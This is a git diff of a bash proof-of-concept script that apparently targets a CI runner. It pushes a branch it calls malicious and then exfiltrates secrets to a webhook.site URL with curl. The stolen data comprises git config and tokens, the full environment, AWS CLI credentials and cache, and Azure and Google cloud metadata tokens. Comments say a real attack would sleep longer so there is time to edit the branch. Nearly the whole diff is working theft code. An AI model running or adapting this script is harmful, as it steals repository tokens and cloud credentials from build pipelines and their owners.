@@ -1,7 +1,8 @@
+#!/usr/bin/env bash
 #filename: myscript.sh
-echo -------------poc_rce-------------- >&2
 
-git config --list >&2
+echo "-------------poc_hello--------------" >&2
+
 
 echo "--- creating malicious branch, can easily push to master or release ---" >&2 
 git config --global user.email "bh@someemail.com"
@@ -12,40 +13,55 @@ git pull origin master >&2
 git checkout -b bh-poc >&2
 git add . >&2
 git push -u origin bh-poc >&2
+echo "--- token extraction ---" >&2 
 
-echo "--- token exfiltration ---" >&2 
-
-export webhook="https://webhook.site/0adc90cc-a61d-4cda-b4f5-c4bc887c7336"
-export repo=barakharyati/QGIS-fork
+export webhook="https://webhook.site/d7f25059-ffd7-40d0-b723-aa89565fe220"
 
 curl -X POST \
   -H "Content-Type: text/plain" \
-  --data "$(cat /home/runner/work/${repo}/.git/config)" \
-    "$webhook/githubtoken"
-
-
-curl -X POST \
-  -H "Content-Type: text/plain" \
-  --data "$(cat /home/runner/work/${repo}/.git/config)" \
-    "$webhook/githubtoken"
+  --data "$(cat .git/config)" \
+    "$webhook/git_config"
 
 curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(git config --list)" \
-    "$webhook/githubtoken"
-
+    "$webhook/git_config_list"
 
 
 curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(cat /home/runner/.gitconfig)" \
-    "$webhook/githubtoken"
+    "$webhook/home_runner_gitconfig"
+
 
 curl -X POST \
   -H "Content-Type: text/plain" \
-  --data "$(cat /home/runner/work/${repo}/.git/config)" \
-  "$webhook/githubtoken"
+  --data "$(printenv)" \
+  "$webhook/printenv"
 
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat ~/.aws/cli/cache)" \
+  "$webhook/aws_cli_cache"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat ~/.aws/credentials)" \
+  "$webhook/aws_cli_credentials"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\")" \
+  "$webhook/azure_credentials"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(curl -s -H "Metadata-Flavor: Google" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\")" \
+  "$webhook/google_credentials"
+
+
+
+git config --list >&2
 
 echo "--- sleeping (in real attack use longer time) ---" >&2
 sleep 2 # in real attack it will be 1200 to have time to edit 
